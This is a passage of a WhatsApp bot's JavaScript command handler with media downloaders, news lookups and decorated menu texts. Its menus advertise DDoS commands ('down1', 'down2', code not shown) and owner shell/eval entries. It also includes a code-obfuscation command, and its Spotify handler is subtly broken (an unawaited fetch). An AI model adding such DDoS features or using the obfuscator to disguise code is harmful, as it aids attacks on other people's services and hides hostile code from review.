ptz.sendMessage(m.chat, {video: {url:HD}, caption: te}, {quoted: m})
} catch (e) {
  	reply(`Verify that the link is from Twitter`)
	}
}
break
case 'obfus': case 'obfuscate':{
if (!q) return m.reply(`Example ${prefix+command} const mitah = require('axios')`)
async function obfus(query) {
    const jsobfus = require('javascript-obfuscator')
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        )
        const result = {
            status: 200,
            author: `${ownername}`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

let meg = await obfus(q)
m.reply(`*Success*

${meg.result}`)
}
break
      
     case 'fb':
           case 'facebook':
case 'facebookvid': {
           if (!args[0]) {
    return m.reply(`Please send the link of a Facebook video\n\nEXAMPLE :\n*${prefix + command}* https://fb.watch/pLLTM4AFrO/?mibkotid=Nii9`)
  }
  const urlRegex = /^(?:https?:\/\/)?(?:www\.)?(?:facebook\.com|fb\.watch)\b([-a-zA-Z0-9@:%_\+.~#?&//=]*)/i;
  if (!urlRegex.test(args[0])) {
    return reply('Url invalid')
  }
  try {
    const result = await fg.fbdl(args[0]);
    const tex = `
        *[ FACEBOOK DL ]*
    Title: ${result.title}`;
    const response = await fetch(result.videoUrl)
    const arrayBuffer = await response.arrayBuffer()
    const videoBuffer = Buffer.from(arrayBuffer)
    ptz.sendMessage(m.chat, {video: videoBuffer, caption: tex}, {quoted: m})
  } catch (error) {
    reply('Maybe private video!')
  }
  }
  break  
         
           case "sad1":
        case "sad2":
        case "sad3":
        case "sad4":
        case "sad5":
        case "sad6":
        case "sad7":
        case "sad8":
        case "sad9":
        case "sad10":
        case "sad11":
        case "sad12":
        case "sad13":
        case "sad14":
        case "sad15":
        case "sad16":
        case "sad17":
        case "sad18":
        case "sad19":
        case "sad20":
        case "sad21":
        case "sad22":
        case "sad23":
        case "sad24":
        case "sad25":
        case "sad26":
        case "sad27":
        case "sad28":
        case "sad29":
        case "sad30":
        case "sad31":
        case "sad32":
        case "sad33":
        case "sad34":
        case "sad35":
             const moai0 = await getBuffer(
          `https://github.com/ZassTdr/Sound-Sad/raw/main/Sad-Music/${command}.mp3`
         );
         ptz.sendMessage(
          m.chat,
          {
           audio: moai0,
           mimetype: "audio/mp4",
           ptt: true,
          },
          { quoted: m }
         );
         break    
       
        case "absenmon": case "absenmenu":
        reply (`╭┈──────────────────
│ *${m2}[ ⏤͟͟͞͞  A B S E N - M E N U ‎ ͟͟͞͞⏤ ]${m2}*
╭┈──────────────────
│  ◦  .ʜᴀᴘᴜꜱᴀʙꜱᴇɴ
│  ◦  .ᴀʙꜱᴇɴ
│  ◦  .ᴄᴇᴋᴀʙꜱᴇɴ
│  ◦  .ᴍᴜʟᴀɪᴀʙꜱᴇɴ
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎ ‎‎ ‎ ‎Ziyo Official ‎  ‎‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
break

case "beritamon": case "beritamenu":
reply (`╭┈──────────────────
│ *${m2}[ ⏤͟͟͞͞  B R T A - M E N U ‎ ͟͟͞͞⏤ ]${m2}*
╭┈──────────────────
│  ◦  .ꜰᴀᴊᴀʀ
│  ◦  .ᴄɴɴ
│  ◦  .ʟᴀʏᴀʀᴋᴀᴄᴀ
│  ◦  .ᴄɴʙᴄ
│  ◦  .ᴛʀɪʙᴜɴ
│  ◦  .ɪɴᴅᴏᴢᴏɴᴇ
│  ◦  .ᴋᴏᴍᴘᴀꜱ
│  ◦  .ᴅᴇᴛɪᴋɴᴇᴡꜱ
│  ◦  .ᴅᴀɪʟʏɴᴇᴡꜱ
│  ◦  .ɪɴᴇᴡꜱ
│  ◦  .ᴏᴋᴇᴢᴏɴᴇ
│  ◦  .ꜱɪɴᴅᴏ
│  ◦  .ᴛᴇᴍᴘᴏ
│  ◦  .ᴀɴᴛᴀʀᴀ
│  ◦  .ᴋᴏɴᴛᴀɴ
│  ◦  .ᴍᴇʀᴅᴇᴋᴀ
│  ◦  .ᴊᴀʟᴀɴᴛɪᴋᴜꜱ-ᴍᴇᴍᴇ
│  ◦  .ɢᴇᴍᴘᴀɴᴇᴡꜱ
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎ ‎‎ ‎ ‎Ziyo Official ‎  ‎‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
break

case "gempanews": {
const link = 'https://data.bmkg.go.id/DataMKG/TEWS/'
try {
let res = await fetch(link+'autogempa.json')
let anu = await res.json()
anu = anu.Infogempa.gempa
let txt = `*GEMPA NEWS*\n\n${anu.Wilayah}\n\n`
txt += `Potensi : ${anu.Potensi}\n`
txt += `Tanggal : ${anu.Tanggal}\n`
txt += `Waktu : ${anu.Jam}\n\n`
txt += `Magnitude : ${anu.Magnitude}\n`
txt += `Kedalaman : ${anu.Kedalaman}\n`
txt += `Koordinat : ${anu.Coordinates}${anu.Dirasakan.length > 3 ? `\nDirasakan : ${anu.Dirasakan}` : ''}`
await ptz.sendMessage(m.chat, { image: { url: link+anu.Shakemap }, caption: txt }, { quoted: m })
} catch (e) {
m.reply(e)
}
}
break   

break
         case "photooxymenu": case "photooxymon": case "photooxy":
        reply(`╭┈──────────────────
│ *${m2}[ ⏤͟͟͞͞  P H O X Y - M E N U ‎ ͟͟͞͞⏤ ]${m2}*
╭┈──────────────────
│  ◦  .ꜱʜᴀᴅᴏᴡ 
│  ◦  .ᴡʀɪᴛᴇ 
│  ◦  .ʀᴏᴍᴀɴᴛɪᴄ 
│  ◦  .ʙᴜʀɴᴘᴀᴘᴇʀ 
│  ◦  .ꜱᴍᴏᴋᴇ 
│  ◦  .ɴᴀʀᴜᴛᴏʙᴀɴɴᴇʀ 
│  ◦  .ʟᴏᴠᴇ 
│  ◦  .ᴜɴᴅᴇʀɢʀᴀꜱꜱ 
│  ◦  .ᴅᴏᴜʙʟᴇʟᴏᴠᴇ 
│  ◦  .ᴄᴏꜰꜰᴇᴄᴜᴘ 
│  ◦  .ᴜɴᴅᴇʀᴡᴀᴛᴇʀᴏᴄᴇᴀɴ 
│  ◦  .ꜱᴍᴏᴋʏɴᴇᴏɴ 
│  ◦  .ꜱᴛᴀʀꜱᴛᴇxᴛ 
│  ◦  .ʀᴀɪɴʙᴏᴡᴇꜰꜰᴇᴄᴛ 
│  ◦  .ʙᴀʟʟᴏᴏɴᴛᴇxᴛ 
│  ◦  .ᴍᴇᴛᴀʟʟɪᴄᴇꜰꜰᴇᴄᴛ 
│  ◦  .ᴇᴍʙʀᴏɪᴅᴇʀʏᴛᴇxᴛ 
│  ◦  .ꜰʟᴀᴍɪɴɢᴛᴇxᴛ 
│  ◦  .ꜱᴛᴏɴᴇᴛᴇxᴛ 
│  ◦  .ᴡʀɪᴛᴇᴀʀᴛ 
│  ◦  .ꜱᴜᴍᴍᴇʀᴛᴇxᴛ 
│  ◦  .ᴡᴏʟꜰᴍᴇᴛᴀʟᴛᴇxᴛ 
│  ◦  .ɴᴀᴛᴜʀᴇ3ᴅᴛᴇxᴛ 
│  ◦  .ʀᴏꜱᴇꜱᴛᴇxᴛ 
│  ◦  .ɴᴀᴛᴜʀᴇᴛʏᴘᴏɢʀᴀᴘʜʏ 
│  ◦  .Qᴜᴏᴛᴇꜱᴜɴᴅᴇʀ 
│  ◦  .ꜱʜɪɴᴇᴛᴇxᴛ
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎ ‎‎ ‎ ‎Ziyo Official ‎  ‎‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
  break
                case "ephotomenu": case "ephotomon": case "ephoto":
        reply(`╭┈──────────────────
│ *${m2}[ ⏤͟͟͞͞  E P H T O - M E N U ‎ ͟͟͞͞⏤ ]${m2}*
╭┈──────────────────
│  ◦  .ɢʟɪᴛᴄʜᴛᴇxᴛ 
│  ◦  .ᴡʀɪᴛᴇᴛᴇxᴛ 
│  ◦  .ᴀᴅᴠᴀɴᴄᴇᴅɢʟᴏᴡ 
│  ◦  .ᴛʏᴘᴏɢʀᴀᴘʜʏᴛᴇxᴛ 
│  ◦  .ᴘɪxᴇʟɢʟɪᴛᴄʜ 
│  ◦  .ɴᴇᴏɴɢʟɪᴛᴄʜ 
│  ◦  .ꜰʟᴀɢᴛᴇxᴛ 
│  ◦  .ꜰʟᴀɢ3ᴅᴛᴇxᴛ 
│  ◦  .ᴅᴇʟᴇᴛɪɴɢᴛᴇxᴛ 
│  ◦  .ʙʟᴀᴄᴋᴘɪɴᴋꜱᴛʏʟᴇ 
│  ◦  .ɢʟᴏᴡɪɴɢᴛᴇxᴛ 
│  ◦  .ᴜɴᴅᴇʀᴡᴀᴛᴇʀᴛᴇxᴛ 
│  ◦  .ʟᴏɢᴏᴍᴀᴋᴇʀ 
│  ◦  .ᴄᴀʀᴛᴏᴏɴꜱᴛʏʟᴇ 
│  ◦  .ᴘᴀᴘᴇʀᴄᴜᴛꜱᴛʏʟᴇ 
│  ◦  .ᴡᴀᴛᴇʀᴄᴏʟᴏʀᴛᴇxᴛ 
│  ◦  .ᴇꜰꜰᴇᴄᴛᴄʟᴏᴜᴅꜱ 
│  ◦  .ʙʟᴀᴄᴋᴘɪɴᴋʟᴏɢᴏ 
│  ◦  .ɢʀᴀᴅɪᴇɴᴛᴛᴇxᴛ 
│  ◦  .ꜱᴜᴍᴍᴇʀʙᴇᴀᴄʜ 
│  ◦  .ʟᴜxᴜʀʏɢᴏʟᴅ 
│  ◦  .ᴍᴜʟᴛɪᴄᴏʟᴏʀᴇᴅɴᴇᴏɴ 
│  ◦  .ꜱᴀɴᴅꜱᴜᴍᴍᴇʀ 
│  ◦  .ɢᴀʟᴀxʏᴡᴀʟʟᴘᴀᴘᴇʀ 
│  ◦  .1917ꜱᴛʏʟᴇ 
│  ◦  .ᴍᴀᴋɪɴɢɴᴇᴏɴ 
│  ◦  .ʀᴏʏᴀʟᴛᴇxᴛ 
│  ◦  .ꜰʀᴇᴇᴄʀᴇᴀᴛᴇ 
│  ◦  .ɢᴀʟᴀxʏꜱᴛʏʟᴇ 
│  ◦  .ʟɪɢʜᴛᴇꜰꜰᴇᴄᴛꜱ
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎ ‎‎ ‎ ‎Ziyo Official ‎  ‎‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
  break
  
  
       
        case "voicemon": case "voicemenu":
        reply(`╭┈──────────────────
│ *${m2}[ ⏤͟͟͞͞  V O I C E - M E N U ‎ ͟͟͞͞⏤ ]${m2}*
╭┈──────────────────
│  ◦  .ʙᴀꜱꜱ
│  ◦  .ʙʟᴏᴡɴ
│  ◦  .ᴅᴇᴇᴘ
│  ◦  .ᴇᴀʀʀᴀᴘᴇ
│  ◦  .ꜰᴀꜱᴛ
│  ◦  .ꜰᴀᴛ
│  ◦  .ɴɪɢʜᴛᴄᴏʀᴇ
│  ◦  .ʀᴇᴠᴇʀꜱᴇ
│  ◦  .ʀᴏʙᴏᴛ
│  ◦  .ꜱʟᴏᴡ
│  ◦  .ꜱᴍᴏᴏᴛʜ
│  ◦  .ᴛᴜᴘᴀɪ
│  ◦  .ꜱᴍᴏᴏᴛʜ
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎ ‎‎ ‎ ‎Ziyo Official ‎  ‎‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
        break
        
        case "privatemon": case "privatemenu":
        reply(`╭┈──────────────────
│ *${m2}[ ⏤͟͟͞͞  P R V T - M E N U ‎ ͟͟͞͞⏤ ]${m2}*
╭┈──────────────────
│  ◦  .ᴍᴇɴꜰᴇꜱꜱ
│  ◦  .ꜱᴛᴏᴘᴄᴏɴꜰᴇꜱꜱ
│  ◦  .ᴛᴏʟᴀᴋᴍᴇɴꜰᴇꜱꜱ
│  ◦  .ʙᴀʟᴀꜱᴍᴇɴꜰᴇꜱꜱ
│  ◦  .ʟᴀɴᴊᴜᴛᴀɴᴏɴʏ
│  ◦  .ꜱᴛᴀʀᴛᴀɴᴏɴʏ
│  ◦  .ᴀɴᴏɴʏᴍᴏᴜꜱᴄʜᴀᴛ
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎ ‎‎ ‎ ‎Ziyo Official ‎  ‎‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
        break
           case "panelmenu": case "panelmon":
        reply(`╭┈──────────────────
│ *${m2}[ ⏤͟͟͞͞  P N E L - M E N U ‎ ͟͟͞͞⏤ ]${m2}*
╭┈──────────────────
│  ◦  .ᴀᴅᴅᴜꜱʀ
│  ◦  .ᴀᴅᴅꜱʀᴠ
│  ◦  .ᴄʀᴀᴛᴇᴀᴅᴍɪɴ
│  ◦  .ᴅᴇʟᴜꜱʀ
│  ◦  .ᴅᴇʟꜱʀᴠ
│  ◦  .ᴅᴇᴛᴜꜱʀ
│  ◦  .ʟɪꜱᴛᴀᴅᴍɪɴ
│  ◦  .ʟɪꜱᴛᴜꜱʀ
│  ◦  .ʟɪꜱᴛꜱʀᴠ
│  ◦  .ʀᴇɪɴꜱᴛᴀʟʟ
│  ◦  .ʀᴇꜱᴛᴀʀᴛꜱʀᴠ
│  ◦  .ʀᴀᴍʟɪꜱᴛ
│  ◦  .ꜱᴘᴀɴᴇʟ
│  ◦  .ꜱᴛᴀʀᴛꜱʀᴠ
│  ◦  .ꜱᴛᴏᴘꜱʀᴠ
│  ◦  .ꜱᴜꜱᴘᴇɴᴅ
│  ◦  .ᴜɴꜱᴜꜱᴘᴇɴᴅ 
│  ◦  .ᴜᴘᴅᴀᴛᴇꜱʀᴠ
│  ◦  .ᴡᴇʙᴘᴀɴᴇʟ
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎ ‎‎ ‎ ‎Ziyo Official ‎  ‎‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
        break    
    case "groupmon": case "groupmenu":
        reply(`╭┈──────────────────
│ *${m2}[ ⏤͟͟͞͞  G R U P - M E N U ‎ ͟͟͞͞⏤ ]${m2}*
╭┈──────────────────
│  ◦  .ᴀᴅᴅ <ᴛᴀɢꜱ>
│  ◦  .ᴋɪᴄᴋ <ᴛᴀɢꜱ>
│  ◦  .ᴇᴠᴇʀʏᴏɴᴇ 
│  ◦  .ᴛᴀɢᴀʟʟ
│  ◦  .ʜɪᴅᴇᴛᴀɢ
│  ◦  .ᴀɴᴛɪʟɪɴᴋ  <ꜱᴇʟᴇᴄᴛ>
│  ◦  .ᴘʀᴏᴍᴏᴛᴇ <ᴛᴀɢꜱ>
│  ◦  .ᴅᴇᴍᴏᴛᴇ <ᴛᴀɢꜱ>
│  ◦  .ᴡᴇʟᴄᴏᴍᴇ
│  ◦  .ꜱᴇᴛᴡᴇʟᴄᴏᴍᴇ
│  ◦  .ꜱᴇᴛɢᴏᴏᴅʙʏᴇ
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎ ‎‎ ‎ ‎Ziyo Official ‎  ‎‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
        break  
        

        case "setwelcome": 
        if (!text) throw "Masukan Deskripsi nya"
        chatdb.setwelcome = text
        m.reply("Succes")
        break
        
        case "welcome": 
        if (!text) return m.reply("On / Off, Ex: .welcome on")
        if (text === "on") {
        if (global.welcome === true) return m.reply ("*_status: true_*")
        global.welcome = true
        m.reply ("*_Succes Change, status: true_*")
        } else if (text === "off") {
        if (global.welcome === false) return m.reply ("*_status: false_*")
        global.welcome = false
        m.reply ("*_Succes Change, status: false_*")
        }
        
        break
        
        
       case "mainmon": case "mainmenu":
        reply(`╭┈──────────────────
│ *${m2}[ ⏤͟͟͞͞  M A I N - M E N U ‎ ͟͟͞͞⏤ ]${m2}*
╭┈──────────────────
│  ◦  .ᴅɪꜱᴋ
│  ◦  .ᴘɪɴɢ
│  ◦  .ʀᴜɴᴛɪᴍᴇ
│  ◦  .ᴋᴏᴅᴇʙᴀʜᴀꜱᴀ
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎ ‎‎ ‎ ‎Ziyo Official ‎  ‎‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
        break
        
        
        case 'instagram': case 'ig': case 'igvideo': case 'igimage': case 'igvid': case 'igimg': {
	  if (!text) return m.reply(`Anda perlu memberikan URL video, postingan, reel, gambar Instagram apa pun`)
  let res
  try {
    res = await fetch(`https://www.guruapi.tech/api/igdlv1?url=${text}`)
  } catch (error) {
    return reply(`An error occurred: ${error.message}`)
  }
  let api_response = await res.json()
  if (!api_response || !api_response.data) {
    return reply(`No video or image found or Invalid response from API.`)
  }
  const mediaArray = api_response.data;
  for (const mediaData of mediaArray) {
    const mediaType = mediaData.type
    const mediaURL = mediaData.url_download
    let cap = `HERE IS THE ${mediaType.toUpperCase()}`
    if (mediaType === 'video') {
       ptz.sendMessage(m.chat, {video: {url: mediaURL}, caption: cap}, {quoted: m})
    } else if (mediaType === 'image') {
       ptz.sendMessage(m.chat, { image: {url: mediaURL}, caption: cap}, {quoted: m})
    }
  }
}
break
case 'spotify': {
if (!text) return m.reply(`Contoh : ${prefix + command} snowfall`);
let api = await fetchJson(`https://api.junn4.my.id/search/spotify?query=${text}`);
const hasil = `*S P O T I F Y - D L*

•° *Title*: ${api.data[0].title}
 • *Duration*: ${api.data[0].duration}
 • *Popular*: ${api.data[0].popularity}
•° *Url*: ${api.data[0].url}
`
ptz.sendMessage(m.chat, {text: hasil, contextInfo:
{
"externalAdReply": {
"title": '- sᴘᴏᴛɪғʏ -',
"body": ``,
"showAdAttribution": true,
"mediaType": 1,
"sourceUrl": '',
"thumbnailUrl": 'https://telegra.ph/file/f57c50616fe6f06bb8c2b.jpg',
"renderLargerThumbnail": true
}
}}, {quoted: m})
setTimeout(() => {
const spodl = fetchJson(`https://api.junn4.my.id/download/spotify?url=${api.data[0].url}`) 
const spoDl = spodl.data.download
ptz.sendMessage(m.chat, {
audio: {
url: spoDl
},
mimetype: 'audio/mpeg',
contextInfo: {
externalAdReply: {
title: `- sᴘᴏᴛɪғʏ -`,
body: "",
thumbnailUrl: 'https://telegra.ph/file/f57c50616fe6f06bb8c2b.jpg', 
sourceUrl: "",
mediaType: 1,
showAdAttribution: true,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
}, 1000)
}
break   

  case 'gdrive': {
		if (!args[0]) return m.reply(`Enter the Google Drive link`)
	try {
	let res = await fg.GDriveDl(args[0])
	 m.reply(`*GDrive DL*

•° *Nama:* ${res.fileName}
 • *Size:* ${res.fileSize}
•° *Type:* ${res.mimetype}`)
    setTimeout(() => {
	ptz.sendMessage(m.chat, { document: { url: res.downloadUrl }, fileName: res.fileName, mimetype: res.mimetype }, {})
	}, 1000)
   } catch {
	reply('Error: Check link or try another link') 
  }
}
break

       case 'mediafire': {
  	if (!args[0]) return reply(`Enter the mediafire link next to the command`)
    if (!args[0].match(/mediafire/gi)) return reply(`Link incorrect`)
    const { mediafiredl } = require('@bochilteam/scraper')
    let full = /f$/i.test(command)
    let u = /https?:\/\//.test(args[0]) ? args[0] : 'https://' + args[0]
    let res = await mediafiredl(args[0])
    let { url, url2, filename, ext, aploud, filesize, filesizeH } = res
    let caption = `*MEDIAFIRE DL*

•° *Number:* ${filename}
 • *Size:* ${filesizeH}
 • *Extension:* ${ext}
•° *Uploaded:* ${aploud}
`.trim()
    ptz.sendMessage(m.chat, { document : { url : url}, fileName : filename, mimetype: ext }, { quoted : m })
    }
    break
        
        
        case "toolsmon": case "toolsmenu":
        reply(`╭┈──────────────────
│ *${m2}[ ⏤͟͟͞͞  T O O L S - M E N U ‎ ͟͟͞͞⏤ ]${m2}*
╭┈──────────────────
│  ◦  .ᴛᴛꜱ
│  ◦  .ʀᴇᴀᴅᴠᴏ
│  ◦  .ᴡᴀʟʟᴘᴀᴘᴇʀ
│  ◦  .ꜰʟᴀᴍɪɴɢ1
│  ◦  .ꜰʟᴀᴍɪɴɢ2
│  ◦  .ꜰʟᴀᴍɪɴɢ3
│  ◦  .ꜰʟᴀᴍɪɴɢ4
│  ◦  .ꜰʟᴀᴍɪɴɢ5
│  ◦  .ꜰʟᴀᴍɪɴɢ6
│  ◦  .ᴋᴏᴅᴇʙᴀʜᴀꜱᴀ
│  ◦  .ʀᴇᴍᴏᴠᴇʙɢ
│  ◦  .ᴛʀ
│  ◦  .ᴊᴀʀᴀᴋ
│  ◦  .ᴏᴄʀ
│  ◦  .ᴋᴀʟᴋᴜʟᴀᴛᴏʀ
│  ◦  .ɢᴇᴛ
│  ◦  .ʏᴛᴍᴘ3
│  ◦  .ʏᴛᴍᴘ4
│  ◦  .ᴛɪᴋᴛᴏᴋ
│  ◦  .ɪɢ
│  ◦  .ꜱᴘᴏᴛɪꜰʏ
│  ◦  .ᴍᴇᴅɪᴀꜰɪʀᴇ
│  ◦  .ɢᴅʀɪᴠᴇ
│  ◦  .ɢɪᴛᴄʟᴏɴᴇ
│  ◦  .ᴛᴡɪᴛᴛᴇʀ 
│  ◦  .ꜰʙ
│  ◦  .ᴏʙꜰᴜꜱ
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎ ‎‎ ‎ ‎Ziyo Official ‎  ‎‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
        break
        case "wallpaper":
        const hhjw = await (await fetch(`https://widipe.com/wallpaper?query=${text}`)).json()
        ptz.sendImage(m.sender, hhjw, m)
        break
      case "stickermon": case "stickermenu": case "stikermenu":
        reply(`╭┈──────────────────
│ *${m2}[ ⏤͟͟͞͞  S T I C K - M E N U ‎ ͟͟͞͞⏤ ]${m2}*
╭┈──────────────────
│  ◦  .ꜱᴛɪᴄᴋᴇʀ
│  ◦  .ᴄʟꜱ
│  ◦  .ꜱᴍᴇᴍᴇ 
│  ◦  .Qᴄ
│  ◦  .ꜱᴍᴇᴛᴀ
│  ◦  .ꜱᴛɪᴄᴋʜᴀɴᴅʜᴏʟᴅ 
│  ◦  .ꜱᴛɪᴄᴋꜱʜɪɴᴏʙᴜ 
│  ◦  .ꜱᴛɪᴄᴋᴄᴜᴅᴅʟᴇ 
│  ◦  .ꜱᴛɪᴄᴋʜɪɢʜꜰɪᴠᴇ 
│  ◦  .ꜱᴛɪᴄᴋᴅᴀɴᴄᴇ 
│  ◦  .ꜱᴛɪᴄᴋᴄʀɪɴɢᴇ 
│  ◦  .ꜱᴛɪᴄᴋʜᴀᴘᴘʏ 
│  ◦  .ꜱᴛɪᴄᴋɢʟᴏᴍᴘ 
│  ◦  .ꜱᴛɪᴄᴋꜱᴍᴜɢ 
│  ◦  .ꜱᴛɪᴄᴋʙʟᴜꜱʜ 
│  ◦  .ꜱᴛɪᴄᴋᴀᴡᴏᴏ 
│  ◦  .ꜱᴛɪᴄᴋᴡᴀᴠᴇ 
│  ◦  .ꜱᴛɪᴄᴋꜱᴍɪʟᴇ 
│  ◦  .ꜱᴛɪᴄᴋꜱʟᴀᴘ 
│  ◦  .ꜱᴛɪᴄᴋᴘᴏᴋᴇ 
│  ◦  .ꜱᴛɪᴄᴋᴡɪɴᴋ 
│  ◦  .ꜱᴛɪᴄᴋʙᴏɴᴋ 
│  ◦  .ꜱᴛɪᴄᴋʙᴜʟʟʏ 
│  ◦  .ꜱᴛɪᴄᴋʏᴇᴇᴛ 
│  ◦  .ꜱᴛɪᴄᴋʙɪᴋᴇ 
│  ◦  .ꜱᴛɪᴄᴋᴋɪꜱꜱ 
│  ◦  .ꜱᴛɪᴄᴋʟɪᴄᴋ 
│  ◦  .ꜱᴛɪᴄᴋᴘᴀᴛ 
│  ◦  .ꜱᴛɪᴄᴋʜᴜɢ 
│  ◦  .ꜱᴛɪᴄᴋᴋɪʟʟ 
│  ◦  .ꜱᴛɪᴄᴋᴄʀʏ 
│  ◦  .ꜱᴛɪᴄᴋꜱᴘᴀɴᴋ 
│  ◦  .ꜱᴛɪᴄᴋᴛɪᴄᴋʟᴇ 
│  ◦  .ᴋɪʟʟ
│  ◦  .ʜᴀɴᴅʜᴏʟᴅ
│  ◦  .ʜɪɢʜꜰɪᴠᴇ
│  ◦  .ᴄʀɪɴɢᴇ
│  ◦  .ᴅᴀɴᴄᴇ
│  ◦  .ʜᴀᴘᴘʏ
│  ◦  .ꜱᴍᴜɢ
│  ◦  .ɢʟᴏᴍᴘ
│  ◦  .ᴡᴀᴠᴇ
│  ◦  .ʙʟᴜꜱʜ 
│  ◦  .ꜱʟᴀᴘ
│  ◦  .ꜱᴍɪʟᴇ
│  ◦  .ᴘᴏᴋᴇ
│  ◦  .ɴᴏᴍ
│  ◦  .ᴡɪɴᴋ
│  ◦  .ʏᴇᴇᴛ
│  ◦  .ʙɪᴛᴇ
│  ◦  .ʙᴏɴᴋ
│  ◦  .ʟɪᴄᴋ
│  ◦  .ᴘᴀᴛ
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎ ‎‎ ‎ ‎Ziyo Official ‎  ‎‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
        break
        case "ddosmenu": case "ddosmon":
        reply(`╭┈──────────────────
│ *${m2}[ ⏤͟͟͞͞  D D O S - M E N U ‎ ͟͟͞͞⏤ ]${m2}*
╭┈──────────────────
│  ◦  .ᴅᴏᴡɴ1
│  ◦  .ᴅᴏᴡɴ2
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎ ‎‎ ‎ ‎Ziyo Official ‎  ‎‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
        break
        case "tempormon": case "tempormenu":
        reply(`╭┈──────────────────
│ *${m2}[ ⏤͟͟͞͞  T E M P - M E N U ‎ ͟͟͞͞⏤ ]${m2}*
╭┈──────────────────
│  ◦  .ᴛᴇᴍᴘ-ꜱᴛᴀʀᴛ 
│  ◦  .ᴛᴇᴍᴘ-ꜱᴛᴏᴘ
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎ ‎‎ ‎ ‎Ziyo Official ‎  ‎‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
        break
        
        case "jadibotmon": case "jadibotmenu":
        reply(`╭┈──────────────────
│ *${m2}[ ⏤͟͟͞͞  J D B O T - M E N U ‎ ͟͟͞͞⏤ ]${m2}*
╭┈──────────────────
│  ◦  .ᴊᴀᴅɪʙᴏᴛ-ᴘᴀɪʀɪɴɢ
│  ◦  .ᴊᴀᴅɪʙᴏᴛ-ꜱᴄᴀɴ
│  ◦  .ꜱᴛᴀʀᴛ-ᴊᴀᴅɪʙᴏᴛ 
│  ◦  .ꜱᴛᴏᴘ-ᴊᴀᴅɪʙᴏᴛ
│  ◦  .ʟɪꜱᴛ-ᴊᴀᴅɪʙᴏᴛ
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎ ‎‎ ‎ ‎Ziyo Official ‎  ‎‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
        break
    case "ownermon": case "ownermenu":
        reply(`╭┈──────────────────
│ *${m2}[ ⏤͟͟͞͞  O W N - M E N U ‎ ͟͟͞͞⏤ ]${m2}*
╭┈──────────────────
│  ◦  .ᴘᴜʙʟɪᴄ
│  ◦  .ꜱᴇʟꜰ
│  ◦   $ 
│  ◦   =>
│  ◦   > 
│  ◦  .ᴀᴅᴅᴄᴀꜱᴇ
│  ◦  .ᴅᴇʟᴄᴀꜱᴇ
│  ◦  .ʟɪꜱᴛᴄᴀꜱᴇ
│  ◦  .ʀᴇꜱᴛᴀʀᴛ
│  ◦  .ꜱᴛᴏᴘ
│  ◦  .ʟɪꜱᴛᴄᴀꜱᴇ
│  ◦  .ɢᴇᴛꜱᴇꜱꜱɪᴏɴ
│  ◦  .ᴅᴇʟꜱᴇꜱꜱɪᴏɴ 
│  ◦  .ɢᴇᴛᴄᴀꜱᴇ
│  ◦  .ꜱᴇᴛʀᴇᴘʟʏ
│  ◦  .ꜱᴇᴛᴍᴇɴᴜ
│  ◦  .ɢᴇᴛꜰᴜɴᴄ
│  ◦  .ᴅᴇʟꜰɪʟᴇ
│  ◦  .ᴅᴇʟꜰᴏʟᴅᴇʀ
│  ◦  .ᴀᴅᴅꜱᴄʀᴀᴘᴇ
│  ◦  .ᴍᴜᴛᴇɢᴄ
│  ◦  .ʙʟᴏᴄᴋ
│  ◦  .ᴜɴʙʟᴏᴄᴋ
│  ◦  .ꜱᴇᴛᴘᴘʙᴏᴛ
│  ◦  .ᴅᴇʟᴘᴘʙᴏᴛ
│  ◦  .ꜱᴇᴛʙɪᴏʙᴏᴛ
│  ◦  .ᴊᴏɪɴ
│  ◦  .ᴀᴅᴅᴏᴡɴᴇʀ
│  ◦  .ᴅᴇʟᴏᴡɴᴇʀ
│  ◦  .ᴀᴅᴅᴘʀᴇᴍ
│  ◦  .ᴅᴇʟᴘʀᴇᴍ
│  ◦  .ʟɪꜱᴛᴘʀᴇᴍ
╰┈────────────────•

  ⟢• ──────────────── •⟢
  |‎‎ ‎ ${m2}< ‎ ‎‎ ‎ ‎Ziyo Official ‎  ‎‎‎</>${m2}  
  ⟢• ──────────────── •⟢`)
        break
    //=================================================//
    case "setmenu":
    if (!isCreator) return 
    if (text === "v1") {
    m.reply("Succes")
    global.setmenu = "v1"
    } else if (text === "v2") {
    m.reply("Succes")
